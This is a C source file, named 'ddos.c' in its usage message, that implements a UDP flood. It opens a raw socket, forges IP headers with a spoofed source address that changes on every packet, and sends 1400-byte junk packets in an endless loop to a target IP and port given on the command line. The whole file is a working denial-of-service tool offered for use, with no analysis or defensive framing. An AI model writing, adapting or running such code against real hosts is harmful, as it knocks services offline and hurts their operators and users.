#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/udp.h>

#define PCKT_SIZE 8192

u_int16_t dest_port;
u_int32_t dest_addr;

unsigned short csum(unsigned short *buf, int nwords)
{
        unsigned long sum;
        for (sum = 0; nwords > 0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}

int prep(char *buf, struct iphdr *ip, struct udphdr *udp)
{
        int sf;

        int one = 1;
        const int *val = &one;

        memset(buf, 0, PCKT_SIZE);
        sf = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sf < 0)
        {
                perror("socket() error");
                exit(2);
        }

        if (setsockopt(sf, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        {
                perror("setsockopt() error");
                exit(2);
        }

        char *data = buf + sizeof(struct iphdr) + sizeof(struct udphdr);
        memset(data, 'X', 1400);

        ip->ihl         = 5;
        ip->version     = 4;
        ip->tos         = 16;
        ip->tot_len     = sizeof(struct iphdr) + sizeof(struct udphdr) + 1400;
        ip->id          = htons(54321);
        ip->ttl         = 64;
        ip->protocol    = 17;
        ip->daddr       = dest_addr;
        ip->saddr       = inet_addr("111.111.111.111");

        udp->source = htons(*"80");
        udp->dest = htons(dest_port);
        udp->len = htons(sizeof(struct udphdr));

        return sf;
}

void send_once(int sf, char *buf, struct iphdr *ip, struct udphdr *udp, struct sockaddr_in sin)
{
        if (ip->saddr >= 0xFFFFFFFE)
                ip->saddr = inet_addr("111.111.111.111");
        ip->saddr++;

//      ip->check = csum((unsigned short *)buf, sizeof(struct iphdr) + sizeof(struct udphdr));

        if (sendto(sf, buf, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        {
                perror("sendto() error");
                exit(3);
        }
        printf("sent.\n");
}

// sp.c <dest-ip> <dest-port> <core>
int main(int argc, char const *argv[])
{
        if (argc != 3)
        {
                printf("\n");
                printf("ddos.c <dest-ip> <dest-port>\n");
                exit(1);
        }

        struct sockaddr_in sin;

        dest_addr = inet_addr(argv[1]);
        dest_port = atoi(argv[2]);

        sin.sin_family = AF_INET;
        sin.sin_port = htons(dest_port);
        sin.sin_addr.s_addr = dest_addr;

        char buf[PCKT_SIZE];
        struct iphdr *ip = (struct iphdr *) buf;
        struct udphdr *udp = (struct udphdr *) (buf + sizeof(struct iphdr));
        int sf;

        sf = prep(buf, ip, udp);

        // without openmp        - took 0.010753
        // with openmp(3threads) - took 0.036626
// #pragma omp parallel
        for (;;)
                send_once(sf, buf, ip, udp, sin);

        close(sf);
}
